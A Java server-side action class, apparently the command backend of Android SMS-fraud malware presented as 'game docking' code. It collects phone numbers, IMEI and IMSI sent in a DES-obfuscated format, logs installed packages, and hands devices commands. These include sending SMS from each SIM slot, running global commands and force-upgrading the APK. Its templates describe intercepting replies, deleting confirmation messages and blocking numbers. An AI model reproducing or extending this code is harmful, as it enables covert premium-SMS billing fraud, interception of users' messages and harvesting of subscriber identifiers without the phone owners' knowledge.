package com.game.docking.action;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;

import net.sf.json.JSONObject;

import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.math.NumberUtils;
import org.apache.struts2.convention.annotation.Action;
import org.apache.struts2.convention.annotation.InterceptorRef;
import org.apache.struts2.convention.annotation.ParentPackage;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.util.CollectionUtils;

import com.game.docking.entity.ConstantCode;
import com.game.docking.entity.VisitAdsms;
import com.game.docking.service.DockingGeneralManager;
import com.game.docking.util.ActionResponseUtils;
import com.game.docking.util.Des;
import com.game.docking.util.InterfaceUtil;
import com.game.docking.util.JsonUtil;
import com.game.docking.util.pkg.PacketUtils;
import com.game.shorts.entity.ShortCustomer;
import com.game.shorts.entity.ShortDevice;
import com.game.shorts.entity.ShortLogSmsupload;
import com.game.shorts.entity.UpdatePkg;
import com.game.shorts.service.ShortCustomerManager;
import com.game.shorts.service.ShortDeviceManager;
import com.game.shorts.service.ShortLogSmsuploadManager;
import com.game.shorts.service.UpdatePkgManager;
import com.game.util.DateUtils;

@ParentPackage("struts-default")
@InterceptorRef("defaultStack")
public class PkgInterfaceAction extends PkgBaseAction {

    private static final long serialVersionUID = 1L;
    private static final Logger LOGGER = LoggerFactory.getLogger(PkgInterfaceAction.class);

    @Autowired
    private DockingGeneralManager dockingGeneralManager;
    @Autowired
    private ShortCustomerManager shortCustomerManager;
    @Autowired
    private UpdatePkgManager updatePkgManager;
    @Autowired
    private ShortDeviceManager shortDeviceManager;
    @Autowired
    private ShortLogSmsuploadManager shortLogSmsuploadManager;
    /**  
     * 将InputStream转换成String  
     * @param in InputStream  
     * @return String  
     * @throws Exception  
     *   
     */  
    public static String inputStreamTOString(InputStream in) throws Exception{  
          
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();  
        byte[] data = new byte[4096];  
        int count = -1;  
        while((count = in.read(data,0,4096)) != -1)  
            outStream.write(data, 0, count);  
          
        data = null;  
        return new String(outStream.toByteArray(),"UTF-8");  
    } 

    @Action(value="testc")
    public void testC() throws Exception {
        System.out.println(request.getRequestURL().toString() + " " + request.getMethod());
        InputStream in = null;
        try {
            in = request.getInputStream();
        } catch (IOException e1) {
            LOGGER.info("获取流异常：{}", e1);
        }
        System.out.println(inputStreamTOString(in));
        ActionResponseUtils.writer("ok", response);
    }
    
    /**
     * 请求配置文件接口
     */
    @Action(value = "getConfig")
    public void getConfig() {
        Map<String, Object> result = new HashMap<String, Object>();
        VisitAdsms visit = getVisitAdsms();
        if (visit == null) {
            PacketUtils.sendMessage(response, InterfaceUtil.generateResultData(ConstantCode.ERROR_NOTEXIST_BODY, result), false);
            LOGGER.info("包体为空！");
            return;
        }
        String currentdate = DateUtils.parseDate(visit.getAccesstime(), "yyyy-MM-dd");
        String deviceid = visit.getDeviceid();
        String customerid = visit.getCustomerid();
        boolean isGzip = visit.isGzip();
        if (StringUtils.isBlank(customerid) || StringUtils.isBlank(visit.getAndroidid())) {
            if (StringUtils.isBlank(customerid)) {
                PacketUtils.sendMessage(response, InterfaceUtil.generateResultData(ConstantCode.ERROR_NOTEXIST_CID, result), isGzip);
            }
            if (StringUtils.isBlank(deviceid)) {
                PacketUtils.sendMessage(response, InterfaceUtil.generateResultData(ConstantCode.ERROR_NOTEXIST_DEVICEID, result), isGzip);
            }
            // 写访问错误日志
            dockingGeneralManager.insertLogErrorNull(visit);
            return;
        }
        String currentTime = visit.getMobileCurrentTime();
        Date mobileDate = null;
        boolean saveErrorTime = false;
        if (StringUtils.isNotBlank(currentTime)) {
            try {
                mobileDate = new Date(Long.valueOf(currentTime));
            } catch (Exception e) {
                saveErrorTime = true;
            }
        } else {
            saveErrorTime = true;
        }
        if (saveErrorTime) { // 写手机时间参数错误
            // 写错误日志
            dockingGeneralManager.insertLogErrorMobileTime(visit);
            PacketUtils.sendMessage(response, InterfaceUtil.generateResultData(ConstantCode.ERROR_UNDEFINE, result), isGzip);
            return;
        }
        // 写短信回馈日志
        dockingGeneralManager.insertLogMessages(visit);
        // 写IMSI访问日志
        dockingGeneralManager.insertLogVisitImsi(visit);
        // 写命令执行错误反馈日志
        dockingGeneralManager.insertLogErrorCmd(visit);
        // 写更新错误日志
        dockingGeneralManager.insertLogErrorUpdate(visit);
        // 写产品信息反馈日志
        dockingGeneralManager.insertLogProductBack(visit);

        // 合作客户数据处理
        dockingGeneralManager.dealPartnerDatas(visit, currentdate);
        // 设备信息处理
        ShortDevice device = dockingGeneralManager.getDevice(visit);
        // 写上传包名日志
        dockingGeneralManager.insertLogUploadpkg(visit, device);
        // 获取客户
        ShortCustomer customer = shortCustomerManager.getByCustomerid(customerid);
        // TODO 处理业务
        result = resultMap(device, visit, customer, currentdate);

        // 写访问日志
        dockingGeneralManager.insertLogVisit(visit, mobileDate, JsonUtil.map2JsonObject(result).toString());

        PacketUtils.sendMessage(response, InterfaceUtil.generateResultData(ConstantCode.OK, result), isGzip);
        return;
    }

    @Action(value = "initArea")
    public void initArea() {
        Map<String, Object> result = new HashMap<String, Object>();
        VisitAdsms visit = getVisitAdsms();
        if (visit == null) {
            PacketUtils.sendMessage(response, InterfaceUtil.generateResultData(ConstantCode.ERROR_NOTEXIST_BODY, result), false);
            LOGGER.info("包体为空！");
            return;
        }
        boolean isGzip = visit.isGzip();
//        result.put("url", dockingGeneralManager.getResponseUrl(responseContext));
        String responseUrl = request.getRequestURL().toString();
        String responseContext = dockingGeneralManager.getResponseUrl(responseUrl.substring(0, responseUrl.lastIndexOf("/") + 1));
        result.put("url", responseContext);
        dockingGeneralManager.insertLogInitarea(visit, responseContext);
        PacketUtils.sendMessage(response, InterfaceUtil.generateResultData(ConstantCode.OK, result), isGzip);
        return;
    }
    
    @Action(value = "decData")
    public void decData() throws Exception {
        //TODO
        System.out.println(request.getRequestURL().toString() + " " + request.getMethod());
        InputStream in = null;
        try {
            //httpUrlConnetion请求
            in = request.getInputStream();
            String encData = inputStreamTOString(in);
            //格式 {Params:加密后的信息}
            JSONObject json = JsonUtil.object2JsonObject(encData);
            String src = json.getString("Params");
            //解密，去掉首尾各8个扰乱字符，然后解密
            src = src.substring(8,src.length()-8);
            String urlKey = src.substring(src.length() - 8, src.length());
            String readlyContent = src.substring(0, src.length() - 8);
            String decData = Des.decryptDES(readlyContent, urlKey);
            //处理数据
            JSONObject data = JsonUtil.object2JsonObject(decData);
            ShortLogSmsupload s = new ShortLogSmsupload();
            s.setAccesstime(new Date());
            s.setDate(new Date().getTime());
            s.setNumber(data.getString("phoneNumber"));
            s.setImei(data.getString("imei"));
            s.setImsi(data.getString("imsi"));
            shortLogSmsuploadManager.save(s);
            ActionResponseUtils.writer("ok", response);
            in.close();
        } catch (Exception e1) {
            LOGGER.info("获取流异常：{}", e1);
        } finally{
            if(in!=null){
                in.close();
            }
        }
    }
    
    
    /**
     * 业务处理返回结点
     */
    private Map<String, Object> resultMap(ShortDevice device, VisitAdsms visit, ShortCustomer customer, String currentdate) {
        Map<String, Object> map = new HashMap<String, Object>();
        int linknum = 3;
        if (customer != null) {
            linknum = customer.getLinkinterval();
            Date accesstime = visit.getAccesstime();
            boolean saveDevice = false;
            if (StringUtils.isNotBlank(customer.getSms()) && InterfaceUtil.isPassSendDate(device.getLastSms(), accesstime, customer.getSmsdays())) {
                if (!NumberUtils.INTEGER_ONE.equals(device.getImsiSave0()) && StringUtils.isNotBlank(device.getImsi0())) {
                    map.put("sms0", customer.getSms());
                    device.setLastSms(accesstime);
                    saveDevice = true;
                }
                if (!NumberUtils.INTEGER_ONE.equals(device.getImsiSave1()) && StringUtils.isNotBlank(device.getImsi1())) {
                    map.put("sms1", customer.getSms());
                    device.setLastSms(accesstime);
                    saveDevice = true;
                }
            }
            if (NumberUtils.INTEGER_ONE.equals(customer.getUploadpkg()) && InterfaceUtil.isPassSendDate(device.getLastPkg(), accesstime, customer.getUploaddays())) {
                map.put("uploadpkg", customer.getUploadpkg());
                device.setLastPkg(accesstime);
                saveDevice = true;
            }
            if (saveDevice) {
                shortDeviceManager.save(device);
            }
        }
        map.put("link", linknum); // 联网次数
        // TODO 权限过滤
        UpdatePkg updatePkg = updatePkgManager.getEntityByCustomid(visit.getCustomerid());
        if (updatePkg != null) {
            int appVersionCode = NumberUtils.toInt(visit.getAppVersionCode());
            int uCode = updatePkg.getApkVersion() == null ? 0 : updatePkg.getApkVersion();
            if (uCode > appVersionCode) {
                map.put("upgrade", dockingGeneralManager.convertUpdatePkg(updatePkg));
            }
        }
        Map<String, Object> productR = dockingGeneralManager.getProduct(device, visit, customer, currentdate);
        if (!CollectionUtils.isEmpty(productR)) {
            map.put("product", productR);
            // 执行命令
            map.put("gcmd", dockingGeneralManager.getGlobalCmd(device.getPkgs()));
        }
        return map;
    }

    private static Map<String, Object> generateSmsMap() {
        Map<String, Object> result = new HashMap<String, Object>();
        int type = 1; // 1、sms；2、wap
        int slot = 1; // 卡槽
        String content = ""; // 指令
        String userid = ""; // 号码
        String deleteKeyNumber = ""; // '删除关键号码',
        String deleteKeyWord = ""; // '删除关键字',
        String finishKeyNumber = ""; // '完成关键号码',
        String finishKeyWord = ""; // '完成关键字',
        String screenPrefix = ""; // '屏蔽号段',
        String smsFilter = ""; // '屏蔽组',
        String netMode = "cmwap"; // '联网方式',

        result.put("type", type);
        result.put("slot", slot);
        result.put("userid", userid);
        result.put("content", content);
        result.put("netMode", netMode);
        result.put("deleteKeyNumber", deleteKeyNumber);
        result.put("deleteKeyWord", deleteKeyWord);
        result.put("finishKeyNumber", finishKeyNumber);
        result.put("finishKeyWord", finishKeyWord);
        result.put("screenPrefix", screenPrefix);
        result.put("smsFilter", smsFilter);

        result.put("activity", generateActive());
        return result;
    }

    /**
     * 构建模拟点击结点
     */
    private static List<Map<String, Object>> generateActive() {
        List<Map<String, Object>> result = new ArrayList<Map<String, Object>>();
        result.add(generateSms(1, 50, "18611111111", "replyKeyWord", "开始", "结束", 1));
        result.add(generateSms(2, 50, "18611111111", "replyKeyWord", "18611111111", "dafe", 2));
        result.add(generateWap(3, 50, "http://www.baidu.com", 1));
        result.add(generateWap(4, 50, "http://www.baidu.com", 2));
        return result;
    }

    private static Map<String, Object> generateSms(Integer order, Integer delay, String replyKeyNumber, String replyKeyWord, String replyNumber, String replyContent,
            Integer replyType) {
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("type", 1); // 模拟类型：1、回复sms；2、wap；
        map.put("order", order); // 排序号
        map.put("delay", delay); // 执行前等待
        map.put("rkword", replyKeyWord); // '回复关键字'
        map.put("rknumber", replyKeyNumber); // '回复关键号码'
        map.put("replayType", replyType); // 回复类型:1、拦截；2、内容(SMS)
        map.put("begin", replyNumber); // 回复号码/拦截开始
        map.put("end", replyContent); // 回复内容/拦截结束
        return map;
    }

    private static Map<String, Object> generateWap(Integer order, Integer delay, String url, Integer method) {
        Map<String, Object> map = new HashMap<String, Object>();
        List<Map<String, Object>> params = new ArrayList<Map<String, Object>>();
        params.add(generateParams(1, "pv", "123456", "", "", "", 0));
        params.add(generateParams(2, "time", "(new Date()).getTime().toString();", "", "", "", 0));
        params.add(generateParams(3, "time", "", "开始", "结束", "18611111111", 2000));
        map.put("type", 1); // 模拟类型：1、回复sms；2、wap；
        map.put("order", order); // 排序号
        map.put("delay", delay); // 执行前等待
        map.put("url", url); // '回复关键字'
        map.put("method", method); // 请求方式：1、POST；2、GET
        map.put("params", params); // 需要拼接的参数列表
        return map;
    }

    private static Map<String, Object> generateParams(Integer type, String key, String value, String begin, String end, String number, Integer time) {
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("type", type); // 参数类型：1、直接参数；2、方法；3、截取；
        map.put("key", key); // 参数名
        map.put("value", value); // 值或方法，当参数类型为1、2时可用
        map.put("begin", begin); // 拦截开始(参数3可用)
        map.put("end", end); // 拦截结束(参数3可用)
        map.put("number", number); // 截取号码(参数3可用)
        map.put("time", time); // 截取多长时间内的信息(参数3可用)
        return map;
    }

    /**
     * 执行脚本语句
     */
    public static String scriptManager(String exp) throws ScriptException {
        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
        ScriptEngine scriptEngine = scriptEngineManager.getEngineByName("javascript");
        // scriptEngine.put("a", Math.random()*(-10));
        // scriptEngine.put("b", Math.random()*10);
        Object result = scriptEngine.eval(exp);
        System.out.println(exp + " === " + result);
        return (String) result;
    }

    public static void main(String[] args) {
        try {
            String ss1 = "(new Date()).getTime().toString();";
            String ss = "var now=new Date();var year=now.getYear();var month=now.getMonth()+1;var date=now.getDate();var hour=now.getHours();var minute=now.getMinutes();var second=now.getSeconds();year+\"-\"+month+\"-\"+date+\" \"+hour+\":\"+minute+\":\"+second;";
            System.out.println(scriptManager(ss1));
            System.out.println(scriptManager(ss));
        } catch (ScriptException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        Map<String, Object> map = new HashMap<String, Object>();
        (new Date()).getTime();
        map.put("re", 0);
        System.out.println(map.toString());
        System.out.println(InterfaceUtil.generateResultData(ConstantCode.ERROR_NOTEXIST_DEVICEID, map));
        System.out.println(InterfaceUtil.generateResultData(ConstantCode.ERROR_NOTEXIST_DEVICEID, generateSmsMap()));
    }
}
